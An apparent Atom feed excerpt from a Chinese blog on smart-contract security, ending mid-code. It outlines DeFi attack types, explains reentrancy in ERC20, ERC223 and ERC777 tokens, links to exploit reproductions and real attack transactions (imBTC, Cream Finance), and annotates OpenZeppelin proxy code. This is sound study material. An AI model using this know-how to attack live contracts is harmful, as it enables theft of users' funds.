    <updated>2022-12-30T03:17:48.974Z</updated>
    
    <content type="html"><![CDATA[<p>据 <a href="https://defiyield.app/rekt-database">REKT 网络攻击数据库</a>统计，自 2012 年以来因欺诈、黑客攻击等非法原因，DeFi 项目总共损失了 723 亿美元。在这损失的 723 亿美元中，仅 59 亿美元被归还。非法分子对 DeFi 项目的网络攻击层出不穷，本份研究报告将对一些常用攻击与欺诈手法做明确的分析报告，愿各位读者能够从中获益，避免经济损失。</p><p><img src="/2022/11/30/DefiHack/image-1-1024x608.png" alt="DeFi 常用攻击手法研究报告：总损失达 723 亿美元，仅 59 亿美元被归还-Web3Caff Research"></p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul><li>私钥泄露<ul><li>原理<ul><li>私钥是什么？</li><li>泄露风险</li></ul></li><li>相关事件<ul><li>Wintermute</li></ul></li><li>防范措施</li></ul></li><li>Rug pull<ul><li>原理</li><li>相关事件<ul><li>Thodex</li></ul></li><li>防范措施</li></ul></li><li>闪电贷攻击<ul><li>原理<ul><li>闪电贷是什么？</li><li>闪电贷攻击如何运作的？</li></ul></li><li>相关事件<ul><li>Beanstalk</li></ul></li><li>防范措施</li></ul></li><li>重入漏洞<ul><li>原理</li><li>相关事件<ul><li>Fei Rari</li></ul></li><li>防范措施</li></ul></li><li>鉴权<ul><li>原理<ul><li>权限控制</li><li>鉴权</li></ul></li><li>相关事件<ul><li>MonoX Finance</li></ul></li><li>防范措施</li></ul></li><li>操纵预言机<ul><li>原理<ul><li>预言机（Oracle）</li><li>操纵预言机</li></ul></li><li>相关事件<ul><li>Inverse Finance</li></ul></li><li>防范措施</li></ul></li><li>逻辑校验漏洞<ul><li>原理</li><li>相关事件<ul><li>Team Finance</li></ul></li><li>防范措施</li></ul></li><li>跨链桥<ul><li>原理<ul><li>跨链</li></ul></li><li>相关事件<ul><li>Ronin Network</li></ul></li><li>防范措施</li></ul></li><li>总结</li><li>参考文献</li></ul><p>全文请见 <a href="https://research.web3caff.com/zh/archives/4507">Web3Caff Research</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;据 &lt;a href=&quot;https://defiyield.app/rekt-database&quot;&gt;REKT 网络攻击数据库&lt;/a&gt;统计，自 2012 年以来因欺诈、黑客攻击等非法原因，DeFi 项目总共损失了 723 亿美元。在这损失的 723 亿美元中，仅 59 亿美元被归</summary>
      
    
    
    
    
    <category term="漏洞" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="事件分析" scheme="http://example.com/tags/%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ERC中的重入</title>
    <link href="http://example.com/2022/11/27/reentrancy-2/"/>
    <id>http://example.com/2022/11/27/reentrancy-2/</id>
    <published>2022-11-27T07:18:30.000Z</published>
    <updated>2022-11-27T07:25:05.769Z</updated>
    
    <content type="html"><![CDATA[<p>所有重入的本质都是不可控的外部调用</p><p>注意：0.8.0 版本以后或使用了 SafeMath 的合约，重入时不能选择状态变量更改为 -= 的模式，否则会因为下溢而 revert</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint256 amount) public &#123;<br>    require(balanceOf[msg.sender] &gt;= amount);<br>    require(token.transfer(msg.sender, amount));<br>    balanceOf[msg.sender] -= amount;<br>&#125;<br></code></pre></td></tr></table></figure><p>比如以上模式就不能重入，只能提取自己真正拥有的代币</p><h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ERC20 中的重入也就是最基础的重入，发生在 ETH 和 ERC20 代币的交换过程中，使用 call 低级调用，并未遵守检查-生效-交互模式，攻击者可以通过重写 fallback 或者 receive 函数来进行重入</p><p>详情见以前的<a href="https://sissice.github.io/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/">博客</a></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/Sissice/reentrancy-exp/tree/main/contracts/erc20">reentrancy-exp/contracts/erc20</a></p><p>运行命令</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">npx hardhat test test/erc20_test<br></code></pre></td></tr></table></figure><h1 id="ERC223"><a href="#ERC223" class="headerlink" title="ERC223"></a>ERC223</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>ERC223 相对于 ERC20，增加了 tokenReceived 函数，本意是防止意外发送的代币被合约接受（并卡在合约的余额中），但是增加了重入风险</p><p>黑客可以利用该函数调用原合约中的问题函数（如未遵守检查-生效-交互模式的函数），多次重入</p><h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/Sissice/reentrancy-exp/tree/main/contracts/erc223">reentrancy-exp/contracts/erc223</a></p><p>运行命令</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">npx hardhat test test/erc223_test<br></code></pre></td></tr></table></figure><h2 id="相关事件"><a href="#相关事件" class="headerlink" title="相关事件"></a>相关事件</h2><h3 id="CTF-Tokenbank"><a href="#CTF-Tokenbank" class="headerlink" title="CTF-Tokenbank"></a>CTF-Tokenbank</h3><p>[capture the ether - Token-bank](<a href="https://sissice.github.io/2022/04/02/capture">https://sissice.github.io/2022/04/02/capture</a> the ether wp/#Token-bank)</p><h1 id="ERC777中的重入"><a href="#ERC777中的重入" class="headerlink" title="ERC777中的重入"></a>ERC777中的重入</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p><a href="https://sissice.github.io/2022/10/31/erc777/">ERC777 标准解析</a></p><p>ERC777 引入了“钩子”的概念，以解决 ERC20 的一些缺陷。使用挂钩让合约知道它正在接收或发送资金并允许它采取行动。</p><p>增加了两个需要用户自己实现的函数：tokensToSend 和 tokensReceived</p><p><img src="/2022/11/27/reentrancy-2/image-20221122111656516.png" alt="image-20221122111656516"></p><p>使用挂钩，接收联系人可以在收到令牌时执行操作，例如，如果向其发送了错误类型的令牌，则取消交易。所以 Tokenlon 似乎做出了正确的选择：所有 ERC20 的优点加上一些额外的很酷的功能。然而，正如他们沮丧地发现的那样，ERC777 钩子也为一些严重的攻击打开了大门！</p><p>如上所示，ERC777 挂钩允许合约在接收或发送资金时执行附加功能。然而，这个功能可能被滥用，允许恶意合约对毫无戒心的调用合约的问题函数，执行重入攻击。</p><p><img src="/2022/11/27/reentrancy-2/image-20221122111744129.png" alt="image-20221122111744129"></p><p>可以重入的场景：</p><ol><li>在余额更新之前在转账功能中向收件人（或攻击者控制的任何其他帐户）进行外部调用。</li><li>在更新余额之前或之后在transferFrom函数中对令牌花费者（或攻击者控制的任何其他帐户）进行外部调用。重要的是要注意所有的transferFrom函数总是以交易所作为接收者来调用，因此在不同的 ERC20 扩展中常见的对接收者的回调并不危险。</li></ol><h2 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/Sissice/reentrancy-exp/tree/main/contracts/erc777">reentrancy-exp/contracts/erc777</a></p><p>运行命令</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">npx hardhat test test/erc777_test<br></code></pre></td></tr></table></figure><h2 id="相关事件-1"><a href="#相关事件-1" class="headerlink" title="相关事件"></a>相关事件</h2><p><a href="https://blog.openzeppelin.com/exploiting-uniswap-from-reentrancy-to-actual-profit/">利用 Uniswap：从重入到实际盈利</a></p><h3 id="imBTC"><a href="#imBTC" class="headerlink" title="imBTC"></a>imBTC</h3><p>2020 年 4 月 18 日 imBTC Uniswap 池被<a href="https://twitter.com/tokenlon/status/1251423721476116480?s=20">黑客攻击并耗尽</a>了价值 30 万的代币</p><p><img src="/2022/11/27/reentrancy-2/image-20221125183759655.png" alt="image-20221125183759655"></p><p>问题主要是<a href="https://github.com/ConsenSys/Uniswap-audit-report-2018-12#31-liquidity-pool-can-be-stolen-in-some-tokens-eg-erc-777-29">在uniswap中ERC777会发生重入</a></p><p>攻击交易：<a href="https://tx.eth.samczsun.com/ethereum/0x32c83905db61047834f29385ff8ce8cb6f3d24f97e24e6101d8301619efee96e">0x32c83905db61047834f29385ff8ce8cb6f3d24f97e24e6101d8301619efee96e</a></p><p><img src="/2022/11/27/reentrancy-2/image-20221125190825762.png" alt="image-20221125190825762"></p><h3 id="Cream-Finance"><a href="#Cream-Finance" class="headerlink" title="Cream Finance"></a>Cream Finance</h3><p>2021 年 8 月 30 日， <a href="https://twitter.com/creamdotfinance/status/1432909467281080323">Cream Finance</a> 遭遇闪电贷攻击，攻击者利用漏洞共计获利5890ETH（约合1880万美元）。</p><p><img src="/2022/11/27/reentrancy-2/image-20221125192416343.png" alt="image-20221125192416343"></p><p>由于 AMP 支持类似 ERC-777 的代币标准，而它的特性与某些协议不相兼容，此次 Cream.Finance 的重入攻击正是操纵了此漏洞。</p><p>这里在更新存储之前进行了转移贷款的操作</p><p><img src="/2022/11/27/reentrancy-2/image-20221125200526963.png" alt="image-20221125200526963"></p><p><a href="https://medium.com/cream-finance/c-r-e-a-m-finance-post-mortem-amp-exploit-6ceb20a630c5">官方解释</a></p><p>攻击交易：<a href="https://tx.eth.samczsun.com/ethereum/0xc90468d698700757f33543039c7cb10d4ca49d57b5417789e7656e73019de674">0xc90468d698700757f33543039c7cb10d4ca49d57b5417789e7656e73019de674</a></p><p><img src="/2022/11/27/reentrancy-2/image-20221125193047131.png" alt="image-20221125193047131"></p>]]></content>
    
    
    <summary type="html">解释并复现了ERC20、ERC223、ERC777中的重入</summary>
    
    
    
    
    <category term="漏洞" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>代理合约学习笔记</title>
    <link href="http://example.com/2022/11/13/upgradeable/"/>
    <id>http://example.com/2022/11/13/upgradeable/</id>
    <published>2022-11-13T09:10:04.000Z</published>
    <updated>2022-11-13T09:14:09.546Z</updated>
    
    <content type="html"><![CDATA[<h2 id="可升级模式"><a href="#可升级模式" class="headerlink" title="可升级模式"></a>可升级模式</h2><p><a href="https://learnblockchain.cn/article/4936">Openzeppelin的三种代理模式 | 登链社区 | 区块链技术社区 (learnblockchain.cn)</a></p><table><thead><tr><th align="left"><strong>代理模式</strong></th><th align="left"><strong>优点</strong></th><th align="left"><strong>缺点</strong></th></tr></thead><tbody><tr><td align="left">透明代理模式</td><td align="left">实施起来相对容易和简单；被广泛使用的</td><td align="left">相对而言，部署需要更多的气体</td></tr><tr><td align="left">钻石代理模式</td><td align="left">通过模块化帮助克服 24KB 的大小限制；增量可升级性</td><td align="left">实施和维护更复杂；使用新术语，让新手更难理解；在撰写本文时，不受 Etherscan 等工具的支持</td></tr><tr><td align="left">UUPS 代理模式</td><td align="left">气体高效；删除可升级性的灵活性</td><td align="left">不常用，因为它是相当新的；升级逻辑（访问控制）需要格外小心，因为它驻留在实施合同中</td></tr></tbody></table><h3 id="EIP1967"><a href="#EIP1967" class="headerlink" title="EIP1967"></a>EIP1967</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p><a href="https://eips.ethereum.org/EIPS/eip-1967">EIP1967官方文档</a></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/proxy/ERC1967">EIP1967代码</a></p><p>该标准产生的背景是因为合约部署越来越多地采用路由合约跟逻辑合约分开部署的方式，这种方式的好处是在升级逻辑合约的时候，只需要将路由合约中逻辑合约的地址更改，就可以路由到新的逻辑合约上。</p><p>EIP-1967的目的是规定一个通用的存储插槽使用标准，用于在代理合约中的特定位置存放逻辑合约的地址。其规定了如下特定的插槽：</p><p>同时，EIP-1967在设计如下插槽的时，特意将计算得到的地址减去1，目的是为了不能知道哈希的前像，进一步减少可能的攻击机会。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">=&gt; 逻辑合约地址 <br>bytes32(uint256(keccak256(&quot;eip1967.proxy.implementation&quot;) - 1)) <br>更新该地址时，需要同时发出： <br>event Upgraded(address indexed implementation); <br> <br>=&gt; beacon地址 <br>bytes32(uint256(keccak256(&quot;eip1967.proxy.beacon&quot;) - 1)) <br>更新该地址时，需要发出： <br>event BeaconUpgraded(address indexed beacon); <br> <br>=&gt; admin 地址,所有代理的所有者，每个网络仅部署一个<br>bytes32(uint256(keccak256(&quot;eip1967.proxy.admin&quot;) - 1)) <br>更新该地址时，需要发出： <br>event AdminChanged(address indexed previousAdmin, address newAdmin); <br> <br></code></pre></td></tr></table></figure><p>该标准是为了解决以下代理合约跟逻辑合约部署存在的问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Proxy&#123; <br> address public owner; <br> address public impl; <br> fallback() external payable&#123;&#125; <br> function updateTo(address _impl) external &#123;&#125; <br>&#125; <br> <br>contract Impl&#123; <br> uint256 public value_0; <br> uint256 public value_1; <br> function modify() public &#123; <br>  value_0 = 0; // 由于是delegatecall, 此时的owner会被设置为0； <br> &#125; <br>&#125; <br> <br></code></pre></td></tr></table></figure><p><img src="/2022/11/13/upgradeable/image-20221104173206225.png" alt="image-20221104173206225"></p><h5 id="ERC1967Upgrade"><a href="#ERC1967Upgrade" class="headerlink" title="ERC1967Upgrade"></a>ERC1967Upgrade</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts (last updated v4.5.0) (proxy/ERC1967/ERC1967Upgrade.sol)<br><br>pragma solidity ^0.8.2;<br><br>import &quot;../beacon/IBeacon.sol&quot;;<br>import &quot;../../interfaces/draft-IERC1822.sol&quot;;<br>import &quot;../../utils/Address.sol&quot;;<br>import &quot;../../utils/StorageSlot.sol&quot;;<br><br>/**<br> * @dev This abstract contract provides getters and event emitting update functions for<br> * https://eips.ethereum.org/EIPS/eip-1967[EIP1967] slots.<br> *<br> * _Available since v4.1._<br> *<br> * @custom:oz-upgrades-unsafe-allow delegatecall<br> */<br>abstract contract ERC1967Upgrade &#123;<br>    // This is the keccak-256 hash of &quot;eip1967.proxy.rollback&quot; subtracted by 1<br>    // 这是“eip1967.proxy.rollback”的 keccak-256 哈希减 1<br>    bytes32 private constant _ROLLBACK_SLOT = 0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143;<br><br>    /**<br>     * @dev Storage slot with the address of the current implementation.<br>     * This is the keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1, and is<br>     * validated in the constructor.<br>     */<br>     // 带有当前实现地址的存储槽。这是“eip1967.proxy.implementation”的 keccak-256 哈希减 1，并在构造函数中验证。<br>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;<br><br>    /**<br>     * @dev Emitted when the implementation is upgraded.<br>     */<br>    event Upgraded(address indexed implementation);<br><br>    /**<br>     * @dev Returns the current implementation address.<br>     */<br>    // 返回当前的逻辑合约地址。<br>    function _getImplementation() internal view returns (address) &#123;<br>        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;<br>    &#125;<br><br>    /**<br>     * @dev Stores a new address in the EIP1967 implementation slot.<br>     */<br>    // 在 EIP1967 实现槽中存储一个新地址。 <br>    function _setImplementation(address newImplementation) private &#123;<br>        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);<br>        StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;<br>    &#125;<br><br>    /**<br>     * @dev Perform implementation upgrade<br>     *<br>     * Emits an &#123;Upgraded&#125; event.<br>     */<br>    //  执行逻辑合约升级操作<br>    function _upgradeTo(address newImplementation) internal &#123;<br>        _setImplementation(newImplementation);<br>        emit Upgraded(newImplementation);<br>    &#125;<br><br>    /**<br>     * @dev Perform implementation upgrade with additional setup call.<br>     *<br>     * Emits an &#123;Upgraded&#125; event.<br>     */<br>    //  执行逻辑合约升级操作，并额外使用 delegatecall 来调用传入的 data<br>    function _upgradeToAndCall(<br>        address newImplementation,<br>        bytes memory data,<br>        bool forceCall<br>    ) internal &#123;<br>        _upgradeTo(newImplementation);<br>        if (data.length &gt; 0 || forceCall) &#123;<br>            Address.functionDelegateCall(newImplementation, data);<br>        &#125;<br>    &#125;<br><br>    /**<br>     * @dev Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.<br>     *<br>     * Emits an &#123;Upgraded&#125; event.<br>     */<br>    // 执行逻辑合约升级操作，对 UUPS 代理进行安全检查，并额外使用 delegatecall 来调用传入的 data<br>    function _upgradeToAndCallUUPS(<br>        address newImplementation,<br>        bytes memory data,<br>        bool forceCall<br>    ) internal &#123;<br>        // Upgrades from old implementations will perform a rollback test. This test requires the new<br>        // implementation to upgrade back to the old, non-ERC1822 compliant, implementation. Removing<br>        // this special case will break upgrade paths from old UUPS implementation to new ones.<br>        //从旧实现升级将执行回滚测试。 此测试需要新的实施升级回旧的、不符合 ERC1822 的实施。 删除这种特殊情况将打破从旧 UUPS 实施到新 UUPS 实施的升级路径。<br>        if (StorageSlot.getBooleanSlot(_ROLLBACK_SLOT).value) &#123;<br>            _setImplementation(newImplementation);<br>        &#125; else &#123;<br>            try IERC1822Proxiable(newImplementation).proxiableUUID() returns (bytes32 slot) &#123;<br>                require(slot == _IMPLEMENTATION_SLOT, &quot;ERC1967Upgrade: unsupported proxiableUUID&quot;);<br>            &#125; catch &#123;<br>                revert(&quot;ERC1967Upgrade: new implementation is not UUPS&quot;);<br>            &#125;<br>            _upgradeToAndCall(newImplementation, data, forceCall);<br>        &#125;<br>    &#125;<br><br>    /**<br>     * @dev Storage slot with the admin of the contract.<br>     * This is the keccak-256 hash of &quot;eip1967.proxy.admin&quot; subtracted by 1, and is<br>     * validated in the constructor.<br>     */<br>    //这是“eip1967.proxy.admin”的 keccak-256 哈希减 1，并且是在构造函数中验证。 <br>    bytes32 internal constant _ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;<br><br>    /**<br>     * @dev Emitted when the admin account has changed.<br>     */<br>    event AdminChanged(address previousAdmin, address newAdmin);<br><br>    /**<br>     * @dev Returns the current admin.<br>     */<br>    // 返回当前管理员 <br>    function _getAdmin() internal view returns (address) &#123;<br>        return StorageSlot.getAddressSlot(_ADMIN_SLOT).value;<br>    &#125;<br><br>    /**<br>     * @dev Stores a new address in the EIP1967 admin slot.<br>     */<br>    //  添加新的管理员<br>    function _setAdmin(address newAdmin) private &#123;<br>        require(newAdmin != address(0), &quot;ERC1967: new admin is the zero address&quot;);<br>        StorageSlot.getAddressSlot(_ADMIN_SLOT).value = newAdmin;<br>    &#125;<br><br>    /**<br>     * @dev Changes the admin of the proxy.<br>     *<br>     * Emits an &#123;AdminChanged&#125; event.<br>     */<br>    // 更改管理员 <br>    function _changeAdmin(address newAdmin) internal &#123;<br>        emit AdminChanged(_getAdmin(), newAdmin);<br>        _setAdmin(newAdmin);<br>    &#125;<br><br>    /**<br>     * @dev The storage slot of the UpgradeableBeacon contract which defines the implementation for this proxy.<br>     * This is bytes32(uint256(keccak256(&#x27;eip1967.proxy.beacon&#x27;)) - 1)) and is validated in the constructor.<br>     */<br>    // UpgradeableBeacon 合约的存储槽，它定义了这个代理的实现。<br>    // 这是 bytes32(uint256(keccak256(&#x27;eip1967.proxy.beacon&#x27;)) - 1)) 并在构造函数中验证。<br>    bytes32 internal constant _BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;<br><br>    /**<br>     * @dev Emitted when the beacon is upgraded.<br>     */<br>    event BeaconUpgraded(address indexed beacon);<br><br>    /**<br>     * @dev Returns the current beacon.<br>     */<br>    // 返回当前 beacon <br>    function _getBeacon() internal view returns (address) &#123;<br>        return StorageSlot.getAddressSlot(_BEACON_SLOT).value;<br>    &#125;<br><br>    /**<br>     * @dev Stores a new beacon in the EIP1967 beacon slot.<br>     */<br>    // 添加一个新的 beacon<br>    function _setBeacon(address newBeacon) private &#123;<br>        require(Address.isContract(newBeacon), &quot;ERC1967: new beacon is not a contract&quot;);<br>        require(<br>            Address.isContract(IBeacon(newBeacon).implementation()),<br>            &quot;ERC1967: beacon implementation is not a contract&quot;<br>        );<br>        StorageSlot.getAddressSlot(_BEACON_SLOT).value = newBeacon;<br>    &#125;<br><br>    /**<br>     * @dev Perform beacon upgrade with additional setup call. Note: This upgrades the address of the beacon, it does<br>     * not upgrade the implementation contained in the beacon (see &#123;UpgradeableBeacon-_setImplementation&#125; for that).<br>     *<br>     * Emits a &#123;BeaconUpgraded&#125; event.<br>     */<br>    // 通过额外的delegatecall调用执行信标升级。 注意：这会升级信标的地址，它不会升级信标中包含的实现（参见&#123;UpgradeableBeacon-_setImplementation&#125;）。<br>    function _upgradeBeaconToAndCall(<br>        address newBeacon,<br>        bytes memory data,<br>        bool forceCall<br>    ) internal &#123;<br>        _setBeacon(newBeacon);<br>        emit BeaconUpgraded(newBeacon);<br>        if (data.length &gt; 0 || forceCall) &#123;<br>            Address.functionDelegateCall(IBeacon(newBeacon).implementation(), data);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>应用</strong></p><p><a href="https://dev.to/yakult/tutorial-write-upgradeable-smart-contract-proxy-contract-with-openzeppelin-1916">https://dev.to/yakult/tutorial-write-upgradeable-smart-contract-proxy-contract-with-openzeppelin-1916</a></p><p><a href="https://eth.antcave.club/solidity-1">https://eth.antcave.club/solidity-1</a></p><p><a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable">https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable</a></p><p>部署和获得逻辑合约地址</p><p>可以在区块链浏览器查看<a href="https://goerli.etherscan.io/address/0xa9e8517c61820d4a35592169e851d4a2719afb8a#code">https://goerli.etherscan.io/address/0xa9e8517c61820d4a35592169e851d4a2719afb8a#code</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>    <span class="hljs-keyword">const</span> Box = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&quot;Box&quot;</span>)<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Deploying Box...&quot;</span>)<br>    <span class="hljs-comment">// 部署可升级的合约，使用 deployProxy()</span><br>    <span class="hljs-keyword">const</span> box = <span class="hljs-keyword">await</span> upgrades.deployProxy(Box,[<span class="hljs-number">42</span>], &#123; <span class="hljs-attr">initializer</span>: <span class="hljs-string">&#x27;store&#x27;</span> &#125;)<br><br>    <span class="hljs-built_in">console</span>.log(box.address,<span class="hljs-string">&quot; box(proxy) address&quot;</span>)<br><br>    <span class="hljs-keyword">const</span> receipt = <span class="hljs-keyword">await</span> box.deployTransaction.wait(<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">await</span> upgrades.erc1967.getImplementationAddress(box.address),<span class="hljs-string">&quot; getImplementationAddress&quot;</span>)<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">await</span> upgrades.erc1967.getAdminAddress(box.address),<span class="hljs-string">&quot; getAdminAddress&quot;</span>)<br>&#125;<br><br>main().catch(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.error(error)<br>    process.exitCode = <span class="hljs-number">1</span><br>&#125;)<br></code></pre></td></tr></table></figure><p>升级</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 